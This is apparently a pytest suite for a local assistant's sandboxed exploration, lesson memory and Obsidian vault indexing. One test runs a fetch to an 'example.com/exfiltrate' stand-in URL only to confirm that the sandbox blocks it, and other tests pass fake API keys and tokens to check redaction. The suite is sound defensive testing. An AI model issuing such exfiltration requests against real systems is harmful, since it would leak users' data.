"""Phase 4: isolated exploration curriculum, ReasoningBank and the OpenViking vault index.

REAL: headless Chrome in a fresh isolated context on a loopback fixture app,
background Blender via ToolRegistry `blender_task`, SQLite ReasoningBank with local
Ollama embeddings (lexical fallback is labelled), the unmodified OpenViking 0.5.0
server from .venv-openviking with local nomic-embed-text. Fixture vaults are
temporary copies; the real Obsidian vault is not touched by these tests.
"""
import functools
import hashlib
import json
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import threading
from types import SimpleNamespace

import pytest

from jarvis.exploration import (BlenderSandboxEnv, Explorer, IsolatedBrowserEnv, IsolationUnavailable,
                                desktop_environment)
from jarvis.learning_memory import LearningMemory, sandbox_registry_factory, trajectory_from_task
from jarvis.reasoning_bank import ReasoningBank, parse_items, validate_item

BASE = Path(__file__).resolve().parents[1]
BLENDER = Path(r'D:\Blender\blender.exe')
OPENVIKING = BASE / '.venv-openviking' / 'Scripts' / 'openviking-server.exe'


def lexical(texts, kind='document'):  # deterministic fallback used where ranking must be exact
    return None


# ---- fixtures -----------------------------------------------------------------------------------------------------
@pytest.fixture(scope='module')
def fixture_origin():
    handler = functools.partial(type('Quiet', (SimpleHTTPRequestHandler,), {'log_message': lambda *a: None}),
                                directory=str(BASE / 'tests' / 'fixtures'))
    server = ThreadingHTTPServer(('127.0.0.1', 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f'http://127.0.0.1:{server.server_port}'
    server.shutdown()
    server.server_close()


def browser_env(origin):
    try:
        return IsolatedBrowserEnv(origin, '/exploration_app.html')
    except IsolationUnavailable as exc:
        pytest.skip('BLOCKED: ' + str(exc))


# ---- 1/4. exploration on disposable fixtures (REAL browser) -----------------------------------------------------------
def test_P04_browser_exploration_learns_and_lessons_prevent_repeat_failure(tmp_path, fixture_origin):
    results = {}
    for label, bank in (('with_bank', ReasoningBank(tmp_path / 'a', embedder=lexical)), ('without_bank', None)):
        explorer = Explorer(tmp_path / label, bank=bank, approved=('fixture-web',))
        results[label] = [explorer.episode('fixture-web', browser_env(fixture_origin), hint_values={'Format': 'csv'})
                          for _ in range(3)]
    with_bank, without = results['with_bank'], results['without_bank']
    assert [r['goal_id'] for r in with_bank] == ['Export', 'Help', 'Export']
    assert with_bank[0]['status'] == 'failed' and 'Choose a format first' in with_bank[0]['steps'][0]['error']
    assert with_bank[2]['status'] == 'completed' and [s['action'] for s in with_bank[2]['steps']] == ['browser_fill', 'browser_click']
    assert with_bank[2]['lessons_used'], 'the anti-pattern lesson was retrieved for the retry'
    assert without[2]['status'] == 'failed'  # same curriculum, no bank: the failure repeats
    assert with_bank[2]['verification'] == ['Exported report.csv']  # independent DOM readback


def test_P04_browser_sandbox_blocks_other_origins_and_desktop_is_disabled(tmp_path, fixture_origin):
    environment = browser_env(fixture_origin)
    environment.reset()
    try:
        environment.page.evaluate("fetch('https://example.com/exfiltrate').catch(() => null)")
        environment.page.wait_for_timeout(300)
        assert any('example.com' in url for url in environment.blocked)
        assert environment.context.cookies() == []
    finally:
        environment.close()
    with pytest.raises(IsolationUnavailable, match='not isolation boundaries'):
        desktop_environment({})
    with pytest.raises(IsolationUnavailable):
        IsolatedBrowserEnv('https://example.com')
    with pytest.raises(ValueError, match='not approved'):
        Explorer(tmp_path, approved=('fixture-web',)).episode('notepad', environment)


def test_P04_blender_sandbox_curriculum_with_api_verification(tmp_path):
    if not BLENDER.is_file():
        pytest.skip('BLOCKED: Blender not installed at the configured path.')
    actions = SimpleNamespace(base=tmp_path, config={'execution_strategy': {'blender_executable': str(BLENDER)}})
    bank = ReasoningBank(tmp_path, embedder=lexical)
    explorer = Explorer(tmp_path, bank=bank, approved=('blender',))
    runs = [explorer.episode('blender', BlenderSandboxEnv(sandbox_registry_factory(actions)), conditions={'version': '4.4'})
            for _ in range(5)]
    assert [(r.get('goal_id'), r['status']) for r in runs] == [
        ('export_gltf', 'failed'), ('export_gltf', 'completed'), ('export_obj', 'completed'),
        ('export_stl', 'completed'), (None, 'curriculum_complete')]
    assert 'matching extension' in runs[0]['steps'][0]['error']
    assert any(c['kind'] == 'captured' for c in explorer.state['skill_candidates'])
    assert not list(Path(tmp_path).glob('jarvis-explore-*'))  # sandboxes are disposable


def test_P04_sandbox_approver_refuses_writes_outside_the_sandbox(tmp_path):
    registry = sandbox_registry_factory(SimpleNamespace(base=tmp_path, config={}))(tmp_path / 'box')
    with pytest.raises(ValueError, match='disposable sandbox'):
        registry.actions._approve('office_xlsx', json.dumps({'file': 'x.xlsx'}), lambda: False)
    with pytest.raises(ValueError, match='disposable sandbox'):
        registry.actions._approve('blender_task', json.dumps({'file': '../escape.blend'}), lambda: False)
    assert registry.actions.allowed_tools == {'blender_task'}


# ---- 2/3. cancellation and restart recovery ---------------------------------------------------------------------------
def test_P04_cancellation_dispatches_nothing(tmp_path, fixture_origin):
    explorer = Explorer(tmp_path, approved=('fixture-web',))
    result = explorer.episode('fixture-web', browser_env(fixture_origin), cancelled=lambda: True)
    assert result['status'] == 'failed' and result['steps'][0]['error'] == 'cancelled before dispatch'
    assert 'call_id' not in result['steps'][0]


def test_P04_restart_marks_inflight_step_uncertain_without_replay(tmp_path):
    root = tmp_path / '.jarvis-runtime' / 'exploration'
    root.mkdir(parents=True)
    (root / 'state.json').write_text(json.dumps({'applications': {'blender': {'inflight': {'task_id': 'x', 'step': {'target': 'export_obj'}}}}}))
    explorer = Explorer(tmp_path, approved=('blender',))
    application = explorer.state['applications']['blender']
    assert 'inflight' not in application and application['uncertain'][0]['task_id'] == 'x'
    (root / 'state.json').write_text('{corrupt')
    assert Explorer(tmp_path).state == {}  # damaged checkpoint: start fresh rather than guess


# ---- 5/6. ReasoningBank extraction, retrieval and contradictions --------------------------------------------------------
def test_P04_success_and_failure_lessons_are_generic_bounded_and_idempotent(tmp_path):
    bank = ReasoningBank(tmp_path, embedder=lexical)
    success = {'task_id': 't1', 'status': 'completed', 'verification': ['readback ok'], 'conditions': {'application': 'app'},
               'steps': [{'action': 'office_xlsx', 'target': 'budget.xlsx', 'verified': True, 'final': True}]}
    failure = {'task_id': 't2', 'status': 'failed', 'verification': [], 'conditions': {'application': 'app'},
               'steps': [{'action': 'browser_click', 'target': 'Save', 'error': r"denied at C:\Users\kunal\secret.txt 'token-123456'"}]}
    assert bank.learn(success)['outcome'] == 'success' and bank.learn(failure)['outcome'] == 'failure'
    assert bank.learn(success)['status'] == 'already_learned'
    rows = {r['kind']: r for r in bank.items()}
    assert set(rows) == {'strategy', 'anti_pattern'}
    text = json.dumps(bank.retrieve('save in app', {'application': 'app'}, k=3))
    assert 'kunal' not in text and 'token-123456' not in text
    claimed = dict(success, verification=[])  # no independent evidence: never a strategy
    claimed['task_id'] = 't3'
    assert bank.learn(claimed)['outcome'] == 'failure'


@pytest.mark.parametrize('content', ['Traceback (most recent call last): boom at 0x7ff', 'api_key=sk-FAKE0123456789abcdefgh',
                                     '{"a": {"b": {"c": [[["raw"]]]}}}'])
def test_P04_raw_logs_and_secrets_never_become_lessons(content):
    with pytest.raises(ValueError):
        validate_item({'kind': 'strategy', 'title': 'Some title', 'description': 'A valid description.', 'content': content})


def test_P04_upstream_markdown_format_is_parsed_and_capped():
    text = ''.join(f'# Memory Item {i}\n## Title T{i} title\n## Description One sentence {i}.\n## Content Do thing {i}.\n'
                   for i in range(5))
    assert len(parse_items(text)) == 3 and parse_items('garbage') == []


def test_P04_retrieval_resolves_contradictions_and_supersession(tmp_path):
    bank = ReasoningBank(tmp_path, embedder=lexical)

    def add(task_id, kind, content, version='1'):
        bank._add({'kind': kind, 'title': 'Export dialog handling', 'description': 'How to export the report file.',
                   'content': content, 'conditions': {'application': 'reports', 'version': version}},
                  {'source': 'test', 'task_id': task_id}, 'test')
    add('a', 'strategy', 'Use the Export dialog and confirm the export report file was written.')
    add('b', 'anti_pattern', 'Avoid the Export dialog for the report file; it never writes the export.')
    result = bank.retrieve('export dialog report file', {'application': 'reports'}, k=5)
    assert len(result['lessons']) == 1 and len(result['contradictions_resolved']) == 1
    assert any(r['relation'] == 'contradicts' for r in bank.relations())
    add('c', 'strategy', 'Use the Export dialog and confirm the export report file was written correctly.', version='2')
    superseded = [r for r in bank.items() if r['superseded_by']]
    assert superseded, 'the version 1 strategy is superseded by version 2'
    bank.feedback([result['lessons'][0]['id']], False)
    bank.feedback([result['lessons'][0]['id']], False)
    bank.feedback([result['lessons'][0]['id']], False)
    assert next(r for r in bank.items() if r['id'] == result['lessons'][0]['id'])['trust'] == 'retracted'


def test_P04_local_embedding_retrieval_is_semantic_when_available(tmp_path):
    from jarvis.local_embeddings import embed
    if embed(['probe']) is None:
        pytest.skip('BLOCKED: local Ollama nomic-embed-text unavailable.')
    bank = ReasoningBank(tmp_path)
    bank._add({'kind': 'strategy', 'title': 'Spreadsheet edits', 'description': 'Changing workbook cells safely.',
               'content': 'Edit workbook cells through the API adapter and read the values back.', 'conditions': {}},
              {'task_id': 'x'}, 'test')
    bank._add({'kind': 'strategy', 'title': 'Music playback', 'description': 'Starting songs on the desktop player.',
               'content': 'Open the music app and press play on the requested track.', 'conditions': {}}, {'task_id': 'y'}, 'test')
    result = bank.retrieve('update the numbers in my excel sheet', k=1)
    assert result['lessons'][0]['title'] == 'Spreadsheet edits' and result['lessons'][0]['method'] == 'embedding'


# ---- 9. corruption and recovery ----------------------------------------------------------------------------------------
def test_P04_damaged_bank_is_preserved_and_replaced(tmp_path):
    path = tmp_path / '.jarvis-runtime' / 'reasoning_bank' / 'bank.sqlite3'
    path.parent.mkdir(parents=True)
    path.write_bytes(b'garbage' * 100)
    bank = ReasoningBank(tmp_path, embedder=lexical)
    assert 'damaged' in bank.error and list(path.parent.glob('bank.damaged-*.sqlite3')) and bank.items() == []


# ---- planner integration ------------------------------------------------------------------------------------------------
def test_P04_lessons_reach_planner_and_tasks_feed_the_bank(tmp_path):
    from jarvis.brain import BrainClient
    actions = SimpleNamespace(base=tmp_path, memory=None, brain=SimpleNamespace(client=SimpleNamespace()))
    learning = LearningMemory(actions, {'reasoning_bank': {'enabled': True}}).attach()
    learning.bank.embedder = lexical
    task = {'task_id': 'z' * 32, 'goal': 'export the report', 'status': 'failed',
            'failures': [{'action': 'browser_click', 'value': 'Export', 'reason': 'Choose a format first'}]}
    assert learning.learn_from_task(task)['outcome'] == 'failure'
    assert learning.learn_from_task(task)['status'] == 'already_learned'
    captured = {}
    client = BrainClient.__new__(BrainClient)
    client.worker_module, client.options, client.lesson_provider = 'test', {}, actions.brain.client.lesson_provider
    client._request_once = lambda operation, cancelled, **data: captured.update(data) or {}
    client._request('plan', lambda: False, goal='export the report from the fixture app')
    assert captured['reasoning_lessons'][0]['kind'] == 'anti_pattern'
    assert set(captured['reasoning_lessons'][0]) == {'id', 'kind', 'title', 'content', 'conditions', 'confidence', 'trust'}
    assert trajectory_from_task({'status': 'completed', 'checkpoints': [{'stage': 'goal_verified', 'evidence': 'ok'}],
                                 'plan': {'completed': [{'action': 'open', 'verified': True}]}})['steps'][0]['final'] is True


# ---- 7/8. OpenViking vault index (REAL server) -------------------------------------------------------------------------
@pytest.fixture(scope='module')
def viking(tmp_path_factory):
    from jarvis.local_embeddings import embed
    if not OPENVIKING.is_file():
        pytest.skip('BLOCKED: .venv-openviking not installed (requirements/openviking.txt).')
    if embed(['probe']) is None:
        pytest.skip('BLOCKED: local Ollama embedding model unavailable.')
    from jarvis.viking_memory import VikingMemory
    root = tmp_path_factory.mktemp('viking')
    vault = root / 'vault'
    for relative, text in {'Projects/Game/blender.md': '# Blender export\nUse glTF binary export for game engines.\n',
                           'Daily/2026-10-17.md': '# Groceries\nRice and tea on Sunday.\n',
                           'Daily/copy.md': '# Groceries\nRice and tea on Sunday.\n',
                           'Jarvis Skills/x/SKILL.md': 'owned by the skill store', '.obsidian/app.md': 'config'}.items():
        (vault / relative).parent.mkdir(parents=True, exist_ok=True)
        (vault / relative).write_text(text, encoding='utf-8')
    memory = VikingMemory(root / 'base', vault, {'port': 19351})
    if not memory.start():
        pytest.skip('BLOCKED: OpenViking server did not start: ' + str(memory.error))
    yield memory
    memory.stop()


def vault_hash(vault):
    digest = hashlib.sha256()
    for path in sorted(vault.rglob('*')):
        if path.is_file():
            digest.update(str(path.relative_to(vault)).encode() + path.read_bytes())
    return digest.hexdigest()


def test_P04_vault_index_links_dedupes_and_preserves_sources(viking):
    before = vault_hash(viking.vault)
    report = viking.index()
    assert report['duplicates'] == 1 and not report['failed']
    manifest = viking.manifest()
    assert set(manifest['files']) == {'Projects/Game/blender.md', 'Daily/2026-10-17.md', 'Daily/copy.md'}
    assert manifest['files']['Daily/copy.md']['duplicate_of'] == 'Daily/2026-10-17.md'
    assert all(row['verified_link'] for name, row in manifest['files'].items() if not row['duplicate_of'])
    hits = viking.find('how do I export models for a game engine', 3)
    assert hits['results'][0]['source_path'] == 'Projects/Game/blender.md' and hits['results'][0]['verified_link']
    assert hits['diagnostics']['engine'] == 'openviking-find-http'
    assert any(node['isDir'] for node in viking.browse(depth=3))  # recursive browsing
    assert vault_hash(viking.vault) == before  # Obsidian sources untouched


def test_P04_incremental_reindex_versions_and_removal(viking):
    viking.index()
    unchanged = viking.index()
    assert unchanged['directories'] == [] and unchanged['changes'] == 0
    note = viking.vault / 'Projects/Game/blender.md'
    note.write_text('# Blender export\nUse glTF binary export; apply transforms first.\n', encoding='utf-8')
    changed = viking.index()
    assert [d['directory'] for d in changed['directories']] == ['Projects']
    assert viking.manifest()['files']['Projects/Game/blender.md']['version'] == 2
    (viking.vault / 'Daily/copy.md').unlink()
    removed = viking.index()
    assert 'Daily/copy.md' not in viking.manifest()['files'] and removed['removed'] == 1


def test_P04_damaged_manifest_is_preserved_and_links_rebuilt(viking):
    viking.index()
    viking.manifest_path.write_text('{corrupt', encoding='utf-8')
    report = viking.index()
    assert list(viking.root.glob('manifest.damaged-*.json')) and report['changes'] >= 2
    assert all(row.get('verified_link') or row.get('duplicate_of') for row in viking.manifest()['files'].values())


def test_P04_vault_hits_reach_task_context_and_are_bounded(viking):
    from jarvis.obsidian_memory import ObsidianMemory
    viking.index()
    learning = LearningMemory.__new__(LearningMemory)
    learning.viking, learning._health = viking, (0., False)
    hits = learning.vault_hits('export a model for a game engine', 2)
    assert 1 <= len(hits) <= 2 and hits[0]['source_path'] == 'Projects/Game/blender.md'
    assert all(len(h['summary']) <= 300 for h in hits)
    memory = ObsidianMemory.__new__(ObsidianMemory)
    memory.viking_provider = lambda goal: hits
    memory._index = lambda: {}
    import jarvis.memory_index as memory_index
    original = memory_index.context
    memory_index.context = lambda index, goal: {}
    try:
        assert memory.task_context('export a model')['vault_hits'] == hits
    finally:
        memory_index.context = original


def test_P04_H1_server_never_starts_without_users_ollama_store(tmp_path, monkeypatch):
    """Regression: OpenViking auto-starts `ollama serve`; Jarvis must start Ollama first with the user's store."""
    from jarvis import viking_memory
    if not OPENVIKING.is_file():
        pytest.skip('BLOCKED: .venv-openviking not installed.')
    (tmp_path / 'vault').mkdir()
    memory = viking_memory.VikingMemory(tmp_path / 'base', tmp_path / 'vault', {'port': 19352})
    monkeypatch.setattr(memory, 'healthy', lambda: False)
    import jarvis.knowledge_worker as worker
    monkeypatch.setattr(worker, 'ensure_server', lambda client: {'models': [{'name': 'qwen3.5:9b'}]})
    assert memory.start() is False and 'not installed' in memory.error
    assert memory.process is None  # OpenViking was never launched, so it could not spawn its own Ollama
    spawned = {}

    def fake_spawn(job, factory):
        def run(argv, **kwargs):
            spawned.update(kwargs['env'])
            raise OSError('stop after capturing the environment')
        return run
    import jarvis.harness_process as harness
    monkeypatch.setattr(harness, 'hidden_spawn', fake_spawn)
    monkeypatch.setattr(worker, 'ensure_server', lambda client: {'models': [{'name': 'nomic-embed-text:latest'}]})
    monkeypatch.setenv('OLLAMA_MODELS', r'D:\Ollama\models')
    with pytest.raises(OSError):
        memory.start()
    assert spawned['OLLAMA_MODELS'] == r'D:\Ollama\models'
